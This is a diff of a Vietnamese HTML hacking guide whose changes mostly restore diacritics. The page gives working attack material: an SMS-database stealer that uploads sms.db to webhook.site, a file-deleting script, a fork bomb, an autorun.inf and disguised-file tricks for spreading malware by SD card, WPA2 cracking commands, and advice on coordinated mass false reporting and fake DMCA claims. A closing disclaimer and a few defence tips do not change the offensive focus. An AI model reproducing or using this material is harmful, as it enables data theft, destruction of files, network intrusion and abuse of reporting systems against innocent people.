-            <button class="accordion-header">CACH REPORT FACEBOOK & TIKTOK</button>
+            <button class="accordion-header">CÁCH REPORT FACEBOOK VÀ TIKTOK</button>
             <div class="accordion-content">
                 <h3>Report Facebook:</h3>
-                <pre>1. Report trang: Vao trang -> "..." -> Tim ho tro hoac bao cao
-2. Report bai viet: Vao bai viet -> "..." -> Bao cao bai viet
-3. Report hang loat: Dung 10-20 tai khoan cung report 1 trang
-4. Report DMCA (manh nhat): facebook.com/help/contact/634636770043106
-   Claim vi pham ban quyen -> Facebook phai xu ly trong 24h
-5. Report gia mao: facebook.com/hacked -> Tai khoan bi gia mao</pre>
+                <pre>1. Report trang: Vào trang -> "..." -> Tìm hỗ trợ hoặc báo cáo
+2. Report bài viết: Vào bài viết -> "..." -> Báo cáo bài viết
+3. Report hàng loạt: Dùng 10-20 tài khoản cùng report 1 trang
+4. Report DMCA (mạnh nhất): facebook.com/help/contact/634636770043106
+   Claim vi phạm bản quyền -> Facebook phải xử lý trong 24h
+5. Report giả mạo: facebook.com/hacked -> Tài khoản bị giả mạo</pre>
                 <h3>Report TikTok:</h3>
-                <pre>1. Report profile: Vao profile -> Share -> Bao cao
-2. Report video: Nhan giu video -> Bao cao
-3. Report hang loat: 20-30 tai khoan cung report
+                <pre>1. Report profile: Vào profile -> Share -> Báo cáo
+2. Report video: Nhấn giữ video -> Báo cáo
+3. Report hàng loạt: 20-30 tài khoản cùng report
 4. Email legal: legal@tiktok.com, feedback@tiktok.com, privacy@tiktok.com
-5. Form chinh thuc: tiktok.com/legal/report/feedback</pre>
+5. Form chính thức: tiktok.com/legal/report/feedback</pre>
             </div>
         </div>
 
-        <!-- 8 -->
+        <!-- 9. Thiết bị hack -->
         <div class="accordion">
-            <button class="accordion-header">THIET BI DUNG DE HACK</button>
+            <button class="accordion-header">THIẾT BỊ DÙNG ĐỂ HACK</button>
             <div class="accordion-content">
                 <h3>1. USB Rubber Ducky</h3>
-                <pre>USB gia lam ban phim. Cam vao -> Tu dong go lenh 1000 tu/phut.
-Mo PowerShell an -> Tai va chay malware.
-Phong chong: Khong cam USB la, tat AutoRun.</pre>
+                <pre>USB giả làm bàn phím. Cắm vào -> Tự động gõ lệnh 1000 từ/phút.
+Mở PowerShell ẩn -> Tải và chạy malware.
+Phòng chống: Không cắm USB lạ, tắt AutoRun.</pre>
                 <h3>2. Flipper Zero</h3>
-                <pre>Cong cu da nang: RFID/NFC, Bluetooth, WiFi, Hong ngoai, Bad USB.
-Copy the tu, mo cua xe, dieu khien TV, spam BLE, WiFi deauth.
-Gia: $169-$200. Hop phap mua nhung dung sai muc dich la pham phap.</pre>
+                <pre>Công cụ đa năng: RFID/NFC, Bluetooth, WiFi, Hồng ngoại, Bad USB.
+Copy thẻ từ, mở cửa xe, điều khiển TV, spam BLE, WiFi deauth.
+Giá: $169-$200. Hợp pháp mua nhưng dùng sai mục đích là phạm pháp.</pre>
                 <h3>3. Raspberry Pi</h3>
-                <pre>May tinh Linux sieu nho ($35).
-Cai Kali Linux -> Bo tool hacking di dong.
-P4wnPi: Tool hack WiFi. Keylogger phan cung. VPN gateway bi mat.</pre>
+                <pre>Máy tính Linux siêu nhỏ ($35).
+Cài Kali Linux -> Bộ tool hacking di động.
+P4wnPi: Tool hack WiFi. Keylogger phần cứng. VPN gateway bí mật.</pre>
                 <h3>4. WiFi Pineapple</h3>
-                <pre>Tao WiFi gia mao (Evil Twin). Nan nhan ket noi -> Doc moi du lieu.
-Captive portal gia -> Lua dang nhap. SSL strip -> Bo ma hoa.</pre>
+                <pre>Tạo WiFi giả mạo (Evil Twin). Nạn nhân kết nối -> Đọc mọi dữ liệu.
+Captive portal giả -> Lừa đăng nhập. SSL strip -> Bỏ mã hóa.</pre>
                 <h3>5. HackRF One</h3>
-                <pre>SDR (Software Defined Radio): Thu/phat song vo tuyen 1MHz-6GHz.
-Nghe len radio, gia mao tin hieu, GPS spoofing.</pre>
+                <pre>SDR (Software Defined Radio): Thu/phát sóng vô tuyến 1MHz-6GHz.
+Nghe lén radio, giả mạo tín hiệu, GPS spoofing.</pre>
             </div>
         </div>
 
-        <!-- 9 -->
+        <!-- 10. Thẻ nhớ SD -->
         <div class="accordion">
-            <button class="accordion-header">THE NHO SD - CACH HACK & CAI VIRUS</button>
+            <button class="accordion-header">THẺ NHỚ SD - CÁCH HACK VÀ CÀI VIRUS</button>
             <div class="accordion-content">
-                <h3>The nho SD la gi?</h3>
+                <h3>Thẻ nhớ SD là gì?</h3>
                 <table>
-                    <tr><th>Loai</th><th>Dung luong</th><th>Dung cho</th></tr>
-                    <tr><td>SD</td><td>Den 2GB</td><td>May anh cu</td></tr>
-                    <tr><td>SDHC</td><td>4GB-32GB</td><td>May anh, laptop</td></tr>
+                    <tr><th>Loại</th><th>Dung lượng</th><th>Dùng cho</th></tr>
+                    <tr><td>SD</td><td>Đến 2GB</td><td>Máy ảnh cũ</td></tr>
+                    <tr><td>SDHC</td><td>4GB-32GB</td><td>Máy ảnh, laptop</td></tr>
                     <tr><td>SDXC</td><td>64GB-2TB</td><td>Camera 4K, drone</td></tr>
-                    <tr><td>MicroSD</td><td>Den 1TB</td><td>Dien thoai, tablet</td></tr>
+                    <tr><td>MicroSD</td><td>Đến 1TB</td><td>Điện thoại, tablet</td></tr>
                 </table>
-                <h3>Cach cai virus vao the SD:</h3>
+                <h3>Cách cài virus vào thẻ SD:</h3>
                 <pre>1. AUTORUN VIRUS:
-Tao file autorun.inf:
+Tạo file autorun.inf với nội dung:
 [AutoRun]
 open=virus.exe
-action=Open folder to view files
--> Khi cam vao may, Windows tu chay virus.exe
+-> Khi cắm vào máy, Windows tự chạy virus.exe
 
-2. GIA MAO DUOI FILE:
-Dung ky tu Unicode U+202E de dao nguoc ten file.
-"photo.jpg[U+202E]exe.scr" -> Windows hien thi "photo.scr.jpg"
-Thuc chat la file .scr (executable)!
+2. GIẢ MẠO ĐUÔI FILE:
+Dùng ký tự Unicode U+202E để đảo ngược tên file.
+"photo.jpg[U+202E]exe.scr" -> Windows hiển thị "photo.scr.jpg"
+Thực chất là file .scr (executable)!
 
 3. SHORTCUT VIRUS:
-Tao shortcut den virus.bat. Doi icon thanh icon anh/thu muc.
-Nan nhan click mo -> Virus chay ngam + anh that mo ra danh lua.
+Tạo shortcut đến virus.bat. Đổi icon thành icon ảnh/thư mục.
+Nạn nhân click mở -> Virus chạy ngầm + ảnh thật mở ra đánh lừa.
 
-4. PAYLOAD TRONG FILE ANH:
+4. PAYLOAD TRONG FILE ẢNH:
 copy /b cat.jpg + virus.exe secret.jpg
-File secret.jpg van mo duoc nhu anh binh thuong.
-Ben trong chua virus.exe.
+File secret.jpg vẫn mở được như ảnh bình thường.
+Bên trong chứa virus.exe.
 
-5. ANDROID MALWARE QUA THE SD:
-Copy file virus.apk vao the SD voi ten hap dan.
+5. ANDROID MALWARE QUA THẺ SD:
+Copy file virus.apk vào thẻ SD với tên hấp dẫn.
 "Game_hay.apk", "Mod_YouTube.apk"
-Nan nhan cai dat -> Dien thoai bi nhiem.
+Nạn nhân cài đặt -> Điện thoại bị nhiễm.
 
-PHONG CHONG:
-Khong cam the SD la vao may
-Tat AutoRun/AutoPlay trong Windows
-Quet virus truoc khi mo
-Format the SD la truoc khi dung</pre>
+PHÒNG CHỐNG:
+- Không cắm thẻ SD lạ vào máy
+- Tắt AutoRun/AutoPlay trong Windows
+- Quét virus trước khi mở
+- Format thẻ SD lạ trước khi dùng</pre>
             </div>
         </div>
 
-        <!-- 10 -->
+        <!-- 11. AI -->
         <div class="accordion">
-            <button class="accordion-header">CACH HOAT DONG CUA AI (TRI TUE NHAN TAO)</button>
+            <button class="accordion-header">CÁCH HOẠT ĐỘNG CỦA AI (TRÍ TUỆ NHÂN TẠO)</button>
             <div class="accordion-content">
-                <h3>AI la gi?</h3>
-                <pre>Day 1 dua tre phan biet cho va meo.
-Cho no xem 10,000 anh cho + 10,000 anh meo.
-Sau do no tu nhan biet duoc -> Do la cach AI hoc!
+                <h3>AI là gì?</h3>
+                <pre>Dạy 1 đứa trẻ phân biệt chó và mèo.
+Cho nó xem 10,000 ảnh chó + 10,000 ảnh mèo.
+Sau đó nó tự nhận biết được -> Đó là cách AI học!
 
-CAC LOAI AI:
-1. AI Hep (Narrow AI - ANI): Chi gioi 1 viec (ChatGPT, Siri)
-2. AI Tong Quat (AGI): Ngang con nguoi -> CHUA TON TAI
-3. AI Sieu Viet (ASI): Thong minh hon nhan loai -> CHUA TON TAI</pre>
-                <h3>Machine Learning hoat dong:</h3>
-                <pre>1. Thu thap du lieu (1 trieu anh, toan bo Wikipedia)
-2. Gan nhan (anh 1: Cho, anh 2: Meo...)
-3. Huan luyen: AI doan -> Sai -> Dieu chinh -> Lap lai
-4. Kiem tra: AI xem anh MOI -> Doan dung >95% -> Thanh cong</pre>
-                <h3>AI dung de hack:</h3>
-                <pre>1. Tao phishing email sieu that (ChatGPT)
-2. Crack mat khau nhanh hon (AI + Hashcat)
-3. Deepfake giong noi/video (lua chuyen tien)
-4. Tu dong tim lo hong (CodeQL, AI + SAST)
-5. Bypass CAPTCHA (nhan dien anh >99%)
-6. Social Engineering AI (chatbot goi dien lua dao 24/7)</pre>
+CÁC LOẠI AI:
+1. AI Hẹp (Narrow AI - ANI): Chỉ giỏi 1 việc (ChatGPT, Siri)
+2. AI Tổng Quát (AGI): Ngang con người -> CHƯA TỒN TẠI
+3. AI Siêu Việt (ASI): Thông minh hơn nhân loại -> CHƯA TỒN TẠI</pre>
+                <h3>Machine Learning hoạt động:</h3>
+                <pre>1. Thu thập dữ liệu (1 triệu ảnh, toàn bộ Wikipedia)
+2. Gán nhãn (ảnh 1: Chó, ảnh 2: Mèo...)
+3. Huấn luyện: AI đoán -> Sai -> Điều chỉnh -> Lặp lại
+4. Kiểm tra: AI xem ảnh MỚI -> Đoán đúng >95% -> Thành công</pre>
+                <h3>AI dùng để hack:</h3>
+                <pre>1. Tạo phishing email siêu thật (ChatGPT)
+2. Crack mật khẩu nhanh hơn (AI + Hashcat)
+3. Deepfake giọng nói/video (lừa chuyển tiền)
+4. Tự động tìm lỗ hổng (CodeQL, AI + SAST)
+5. Bypass CAPTCHA (nhận diện ảnh >99%)
+6. Social Engineering AI (chatbot gọi điện lừa đảo 24/7)</pre>
             </div>
         </div>
 
-        <!-- 11 -->
+        <!-- 12. Các loại file -->
         <div class="accordion">
-            <button class="accordion-header">CAC LOAI FILE - CONG DUNG & CACH HACK</button>
+            <button class="accordion-header">CÁC LOẠI FILE - CÔNG DỤNG VÀ CÁCH HACK</button>
             <div class="accordion-content">
                 <h3>File .TXT</h3>
-                <pre>Van ban thuan, ghi chu, log, code.
-Hack: Gia mao duoi file (virus.txt.exe), nhung script doc.</pre>
+                <pre>Văn bản thuần, ghi chú, log, code.
+Hack: Giả mạo đuôi file (virus.txt.exe), nhúng script độc.</pre>
                 <h3>File .PDF</h3>
-                <pre>Tai lieu khong thay doi dinh dang.
-Hack: Nhung JavaScript doc, exploit lo hong Adobe Reader, PDF phishing.
-Phong: Tat JavaScript, dung SumatraPDF.</pre>
+                <pre>Tài liệu không thay đổi định dạng.
+Hack: Nhúng JavaScript độc, exploit lỗ hổng Adobe Reader, PDF phishing.
+Phòng: Tắt JavaScript, dùng SumatraPDF.</pre>
                 <h3>File .ZIP / .RAR</h3>
-                <pre>Nen nhieu file thanh 1, giam dung luong.
-Hack: ZIP BOMB (42KB -> 4.5PB), ZIP Slip Attack, brute force mat khau.</pre>
+                <pre>Nén nhiều file thành 1, giảm dung lượng.
+Hack: ZIP BOMB (42KB -> 4.5PB), ZIP Slip Attack, brute force mật khẩu.</pre>
                 <h3>File .APK (Android)</h3>
-                <pre>File cai ung dung Android.
-Hack: Tao APK doc (msfvenom), nhung malware vao APK that, permission abuse.
-Dau hieu: Xin quyen la, tu nguon khong chinh thong.</pre>
+                <pre>File cài ứng dụng Android.
+Hack: Tạo APK độc (msfvenom), nhúng malware vào APK thật, permission abuse.
+Dấu hiệu: Xin quyền lạ, từ nguồn không chính thống.</pre>
                 <h3>File .IPA (iOS)</h3>
-                <pre>File cai ung dung iPhone/iPad.
-Hack: Sideload IPA doc qua AltStore, fake app, enterprise certificate abuse.
-Chi cai duoc app ngoai neu jailbreak hoac sideload.</pre>
+                <pre>File cài ứng dụng iPhone/iPad.
+Hack: Sideload IPA độc qua AltStore, fake app, enterprise certificate abuse.
+Chỉ cài được app ngoài nếu jailbreak hoặc sideload.</pre>
             </div>
         </div>
 
-        <!-- 12 -->
+        <!-- 13. Cách lừa đảo -->
         <div class="accordion">
-            <button class="accordion-header">TAT CA CAC CACH LUA DAO CUA HACKER</button>
+            <button class="accordion-header">TẤT CẢ CÁC CÁCH LỪA ĐẢO CỦA HACKER</button>
             <div class="accordion-content">
-                <pre>1. PHISHING: Tao trang web gia mao -> Gui link -> Danh cap mat khau
+                <pre>1. PHISHING: Tạo trang web giả mạo -> Gửi link -> Đánh cắp mật khẩu
 
-2. VISHING: Goi dien gia lam ngan hang/cong an -> Lua lay OTP
+2. VISHING: Gọi điện giả làm ngân hàng/công an -> Lừa lấy OTP
 
-3. SMISHING: SMS gia mao trung thuong, giao hang -> Click link doc
+3. SMISHING: SMS giả mạo trúng thưởng, giao hàng -> Click link độc
 
-4. LUA DAO MXH:
-   - Gia mao nguoi than: "Cho muon 5 trieu"
-   - Lua tinh cam: Ket ban, tan tinh, muon tien
-   - Lua viec lam: "Tuyen CTV Shopee, hoa hong 20%"
-   - Lua dau tu: "Forex lai 300%/thang"
-   - Lua qua tang: "Tang iPhone, chi tra ship 200k"
+4. LỪA ĐẢO MXH:
+   - Giả mạo người thân: "Cho mượn 5 triệu"
+   - Lừa tình cảm: Kết bạn, tán tỉnh, mượn tiền
+   - Lừa việc làm: "Tuyển CTV Shopee, hoa hồng 20%"
+   - Lừa đầu tư: "Forex lãi 300%/tháng"
+   - Lừa quà tặng: "Tặng iPhone, chỉ trả ship 200k"
 
-5. TECH SUPPORT SCAM: Popup "May bi virus" -> Goi dien -> Cai TeamViewer -> Chiem may
+5. TECH SUPPORT SCAM: Popup "Máy bị virus" -> Gọi điện -> Cài TeamViewer -> Chiếm máy
 
-6. SIM SWAP: Gia lam ban -> Goi nha mang -> Doi SIM -> Nhan OTP -> Chiem tai khoan
+6. SIM SWAP: Giả làm bạn -> Gọi nhà mạng -> Đổi SIM -> Nhận OTP -> Chiếm tài khoản
 
-DAU HIEU NHAN BIET LUA DAO:
-- URL la, sai chinh ta
-- Yeu cau gap: "Xac minh ngay!"
-- Khong co HTTPS
-- Email tu dia chi la
-- Yeu cau cung cap OTP, mat khau</pre>
+DẤU HIỆU NHẬN BIẾT LỪA ĐẢO:
+- URL lạ, sai chính tả
+- Yêu cầu gấp: "Xác minh ngay!"
+- Không có HTTPS
+- Email từ địa chỉ lạ
+- Yêu cầu cung cấp OTP, mật khẩu</pre>
             </div>
         </div>
 
-        <!-- 13 -->
+        <!-- 14. iSH Shell -->
         <div class="accordion">
-            <button class="accordion-header">ISH SHELL - LENH CO BAN TREN IPHONE</button>
+            <button class="accordion-header">iSH SHELL - LỆNH CƠ BẢN TRÊN IPHONE</button>
             <div class="accordion-content">
-                <pre>Cai dat: App Store -> Tim "iSH Shell" -> Cai dat.
+                <pre>Cài đặt: App Store -> Tìm "iSH Shell" -> Cài đặt.
 
-LENH CO BAN:
-ls          -> Liet ke file/thu muc
-cd          -> Di chuyen thu muc
-pwd         -> Xem thu muc hien tai
-mkdir       -> Tao thu muc moi
-touch       -> Tao file moi
-rm          -> Xoa file
-rm -rf      -> Xoa thu muc (can than!)
-cp          -> Sao chep
-mv          -> Di chuyen/doi ten
-cat         -> Xem noi dung file
-echo        -> In ra man hinh
-chmod +x    -> Phan quyen thuc thi
-wget URL    -> Tai file tu internet
-curl URL    -> Gui HTTP request
+LỆNH CƠ BẢN:
+ls          -> Liệt kê file/thư mục
+cd          -> Di chuyển thư mục
+pwd         -> Xem thư mục hiện tại
+mkdir       -> Tạo thư mục mới
+touch       -> Tạo file mới
+rm          -> Xóa file
+rm -rf      -> Xóa thư mục (cẩn thận!)
+cp          -> Sao chép
+mv          -> Di chuyển/đổi tên
+cat         -> Xem nội dung file
+echo        -> In ra màn hình
+chmod +x    -> Phân quyền thực thi
+wget URL    -> Tải file từ internet
+curl URL    -> Gửi HTTP request
 
-CAI PACKAGES:
+CÀI PACKAGES:
 apk update && apk upgrade
 apk add nmap python3 git curl wget openssh netcat-openbsd vim
 
-SU DUNG NMAP:
-nmap -sn 192.168.1.0/24     -> Quet thiet bi trong mang
-nmap -sV target.com          -> Xem version dich vu
-nmap -p 1-1000 target.com    -> Quet 1000 port dau
+SỬ DỤNG NMAP:
+nmap -sn 192.168.1.0/24     -> Quét thiết bị trong mạng
+nmap -sV target.com          -> Xem version dịch vụ
+nmap -p 1-1000 target.com    -> Quét 1000 port đầu
 
 NETCAT (NC):
-nc -lvp 4444                 -> Lang nghe port 4444
-nc target.com 4444           -> Ket noi den port</pre>
+nc -lvp 4444                 -> Lắng nghe port 4444
+nc target.com 4444           -> Kết nối đến port</pre>
             </div>
         </div>
 
-        <!-- 14 -->
+        <!-- 15. Tạo virus nhanh -->
         <div class="accordion">
-            <button class="accordion-header">TAO VIRUS NHANH TREN IPHONE/ANDROID</button>
+            <button class="accordion-header">TẠO VIRUS NHANH TRÊN IPHONE/ANDROID</button>
             <div class="accordion-content">
-                <pre>1. FORK BOMB (Treo may):
+                <pre>1. FORK BOMB (Treo máy):
 :(){ :|:& };:    (Bash)
 
-2. VIRUS XOA DU LIEU (Python):
+2. VIRUS XÓA DỮ LIỆU (Python):
 import os, shutil
 shutil.rmtree("/var/mobile/Documents/")
 
-3. STEALER (Danh cap du lieu):
+3. STEALER (Đánh cắp dữ liệu):
 import requests
 files = ['/var/mobile/Library/SMS/sms.db']
 for f in files:
     requests.post('https://webhook.site/ID', files={'file': open(f,'rb')})
 
-4. FAKE UPDATE (Lua dao):
+4. FAKE UPDATE (Lừa đảo):
 while True:
-    print("DANG CAP NHAT... KHONG TAT NGUON!")
+    print("ĐANG CẬP NHẬT... KHÔNG TẮT NGUỒN!")
     time.sleep(1)
 
 5. SMS BOMBER:
@@ -533,123 +644,93 @@ while True:
             </div>
         </div>
 
-        <!-- 15 -->
+        <!-- 16. Android & iOS -->
         <div class="accordion">
-            <button class="accordion-header">CACH HOAT DONG CUA ANDROID & iOS</button>
+            <button class="accordion-header">CÁCH HOẠT ĐỘNG CỦA ANDROID VÀ iOS</button>
             <div class="accordion-content">
                 <h3>iOS Architecture:</h3>
-                <pre>Cocoa Touch (UIKit, SwiftUI) -> Giao dien
-Media (Core Audio, Video) -> Am thanh, hinh anh
-Core Services (Core Data, Foundation) -> Dich vu cot loi
-Core OS (Kernel XNU, APFS) -> Quan ly phan cung
+                <pre>Cocoa Touch (UIKit, SwiftUI) -> Giao diện
+Media (Core Audio, Video) -> Âm thanh, hình ảnh
+Core Services (Core Data, Foundation) -> Dịch vụ cốt lõi
+Core OS (Kernel XNU, APFS) -> Quản lý phần cứng
 
-Bao mat iOS:
+Bảo mật iOS:
 Secure Boot Chain -> Sandbox -> Code Signing -> ASLR -> DEP -> Keychain</pre>
                 <h3>Android Architecture:</h3>
                 <pre>System Apps -> Java API Framework -> Android Runtime + Native Libs
 -> Hardware Abstraction Layer (HAL) -> Linux Kernel
 
-Bao mat Android:
+Bảo mật Android:
 Verified Boot -> SELinux -> App Sandbox -> Permissions -> Google Play Protect</pre>
             </div>
         </div>
 
-        <!-- 16 -->
+        <!-- 17. WiFi Hacking -->
         <div class="accordion">
-            <button class="accordion-header">WIFI HACKING - CACH HOAT DONG & TAN CONG</button>
+            <button class="accordion-header">WIFI HACKING - CÁCH HOẠT ĐỘNG VÀ TẤN CÔNG</button>
             <div class="accordion-content">
-                <pre>WIFI HOAT DONG:
-Dung song vo tuyen 2.4GHz hoac 5GHz.
-Chuan: 802.11b/g/n/ac/ax (WiFi 6).
-AP (Router) <-song-> STA (Thiet bi)
+                <pre>WIFI HOẠT ĐỘNG:
+Dùng sóng vô tuyến 2.4GHz hoặc 5GHz.
+Chuẩn: 802.11b/g/n/ac/ax (WiFi 6).
+AP (Router) <-sóng-> STA (Thiết bị)
 
-BAO MAT WiFi:
-WEP (qua yeu, crack trong vai phut)
-WPA/WPA2 (manh hon, bat handshake roi crack)
-WPA3 (manh nhat, kho crack)
+BẢO MẬT WiFi:
+WEP (quá yếu, crack trong vài phút)
+WPA/WPA2 (mạnh hơn, bắt handshake rồi crack)
+WPA3 (mạnh nhất, khó crack)
 
-CAC BUOC TAN CONG WPA2:
-1. Bat monitor mode: airmon-ng start wlan0
-2. Quet mang: airodump-ng wlan0mon
-3. Chon muc tieu, bat handshake: airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
-4. Deauth client de bat handshake: aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon
+CÁC BƯỚC TẤN CÔNG WPA2:
+1. Bật monitor mode: airmon-ng start wlan0
+2. Quét mạng: airodump-ng wlan0mon
+3. Bắt handshake: airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
+4. Deauth để bắt handshake: aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon
 5. Crack password: aircrack-ng -w wordlist.txt capture-01.cap
 
-PHONG CHONG:
-Dung WPA3 hoac WPA2 + mat khau manh (>12 ky tu)
-Tat WPS
-An SSID (ko hieu qua lam)
-Mac filtering</pre>
+PHÒNG CHỐNG:
+Dùng WPA3 hoặc WPA2 + mật khẩu mạnh (>12 ký tự)
+Tắt WPS</pre>
             </div>
         </div>
 
-        <!-- 17 -->
+        <!-- 18. Cách hoạt động của Virus -->
         <div class="accordion">
-            <button class="accordion-header">CACH HOAT DONG CUA VIRUS</button>
+            <button class="accordion-header">CÁCH HOẠT ĐỘNG CỦA VIRUS</button>
             <div class="accordion-content">
-                <pre>VIRUS LA GI?
-Phan mem doc hai, tu nhan ban nhu virus sinh hoc.
-Can "vat chu" (file, chuong trinh) de ton tai.
+                <pre>VIRUS LÀ GÌ?
+Phần mềm độc hại, tự nhân bản như virus sinh học.
+Cần "vật chủ" (file, chương trình) để tồn tại.
 
-CAC LOAI VIRUS:
-1. File Infector: Lay nhiem file .exe, .com
-2. Macro Virus: Lay nhiem file Word, Excel
-3. Boot Sector Virus: Lay nhiem boot sector o cung
-4. Worm: Tu lay lan qua mang, khong can file vat chu
-5. Trojan: Gia mao phan mem hop phap
-6. Ransomware: Ma hoa file, doi tien chuoc
-7. Spyware: Giam sat nguoi dung
-8. Adware: Hien thi quang cao
-9. Rootkit: An minh, chiem quyen root
-10. Keylogger: Ghi lai phim bam
+CÁC LOẠI VIRUS:
+1. File Infector: Lây nhiễm file .exe, .com
+2. Macro Virus: Lây nhiễm file Word, Excel
+3. Boot Sector Virus: Lây nhiễm boot sector ổ cứng
+4. Worm: Tự lây lan qua mạng, không cần file vật chủ
+5. Trojan: Giả mạo phần mềm hợp pháp
+6. Ransomware: Mã hóa file, đòi tiền chuộc
+7. Spyware: Giám sát người dùng
+8. Adware: Hiển thị quảng cáo
+9. Rootkit: Ẩn mình, chiếm quyền root
+10. Keylogger: Ghi lại phím bấm
 
-CACH VIRUS LAY LAN:
+CÁCH VIRUS LÂY LAN:
 1. Email attachment
-2. USB/ The nho
-3. Tai file tu web doc
-4. Khai thac lo hong phan mem
-5. Mang noi bo (worm)
+2. USB/Thẻ nhớ
+3. Tải file từ web độc
+4. Khai thác lỗ hổng phần mềm
+5. Mạng nội bộ (worm)
 
-CACH VIRUS HOAT DONG:
-1. Lay nhiem (Infection): Chen ma doc vao file/sys
-2. Kich hoat (Trigger): Mo file, chay chuong trinh
-3. Thuc thi (Payload): Danh cap du lieu, pha hoai
-4. Nhan ban (Replication): Tu copy sang file/ may khac</pre>
-            </div>
-        </div>
-
-        <!-- 18 -->
-        <div class="accordion">
-            <button class="accordion-header">TV HACKING & IoT HACKING</button>
-            <div class="accordion-content">
-                <pre>TV THONG MINH (Smart TV):
-Chay he dieu hanh: Tizen (Samsung), WebOS (LG), Android TV (Sony, Xiaomi).
-Ket noi WiFi, Bluetooth, HDMI.
-
-CACH HACK TV:
-1. WiFi Deauth: Dung Flipper Zero gui goi deauth -> TV mat ket noi
-2. SSDP Exploit: Khai thac UPnP/SSDP protocol
-3. Remote App Gia: Ket noi qua WiFi, dieu khien TV
-4. HDMI-CEC Exploit: Dieu khien TV qua cong HDMI
-5. Firmware Attack: Flash firmware doc qua USB (can quyen truy cap)
-
-IoT (Internet of Things) HACKING:
-Thiet bi IoT: Camera, den thong minh, khoa cua, lo vi song...
-Nhieu thiet bi IoT co bao mat kem.
-Mat khau mac dinh, khong ma hoa, firmware loi.
-
-PHONG CHONG:
-Doi mat khau mac dinh
-Cap nhat firmware
-Tat UPnP tren router
-Mang rieng cho IoT (VLAN)</pre>
+CÁCH VIRUS HOẠT ĐỘNG:
+1. Lây nhiễm: Chèn mã độc vào file/hệ thống
+2. Kích hoạt: Mở file, chạy chương trình
+3. Thực thi: Đánh cắp dữ liệu, phá hoại
+4. Nhân bản: Tự copy sang file/máy khác</pre>
             </div>
         </div>
 
         <div class="warning">
-            TUYEN BO MIEN TRU TRACH NHIEM: Tai lieu nay chi danh cho muc dich HOC TAP VA NGHIEN CUU BAO MAT.
-            Moi hanh vi su dung vao muc dich bat hop phap deu bi NGHIEM CAM va co the dan den TRUY CUU HINH SU.
-            Hay tro thanh WHITE HAT HACKER - nguoi bao ve internet!
+            TUYÊN BỐ MIỄN TRỪ TRÁCH NHIỆM: Tài liệu này chỉ dành cho mục đích HỌC TẬP VÀ NGHIÊN CỨU BẢO MẬT.
+            Mọi hành vi sử dụng vào mục đích bất hợp pháp đều bị NGHIÊM CẤM và có thể dẫn đến TRUY CỨU HÌNH SỰ.
+            Hãy trở thành WHITE HAT HACKER - người bảo vệ internet!
         </div>
 
     </div>
@@ -658,8 +739,7 @@ Mang rieng cho IoT (VLAN)</pre>
         document.querySelectorAll('.accordion-header').forEach(button => {
             button.addEventListener('click', () => {
                 button.classList.toggle('active');
-                const content = button.nextElementSibling;
-                content.classList.toggle('show');
+                button.nextElementSibling.classList.toggle('show');
             });
         });
     </script>
